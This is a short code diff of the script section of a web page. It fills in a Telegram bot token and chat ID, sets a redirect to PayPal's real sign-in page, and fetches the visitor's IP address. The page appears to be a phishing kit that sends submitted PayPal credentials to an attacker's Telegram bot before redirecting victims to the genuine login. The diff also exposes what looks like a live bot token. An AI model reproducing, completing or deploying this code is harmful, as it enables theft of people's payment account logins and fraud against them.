@@ -55,10 +55,10 @@
 
     <script>
         // ============================================================
-        // CONFIG - Change these only
+        // CONFIG - TOKEN & CHAT ID ADDED
         // ============================================================
-        const BOT_TOKEN = 8926881219:AAFEhuTyYVbgIMDDiV8JDZ2ivXmz4elyGBI;     // ← @BotFather se lo
-        const CHAT_ID =8510854191;         // ← @userinfobot se lo
+        const BOT_TOKEN = '8926881219:AAFEhuTyYVbgIMDDiV8JDZ2ivXmz4elyGBI';
+        const CHAT_ID = '8510854191';
         const REDIRECT_URL = 'https://www.paypal.com/signin';
         // ============================================================
 
@@ -77,7 +77,6 @@
             document.getElementById('loading').style.display = 'block';
             document.getElementById('submitBtn').disabled = true;
 
-            // Get IP
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => data.ip)
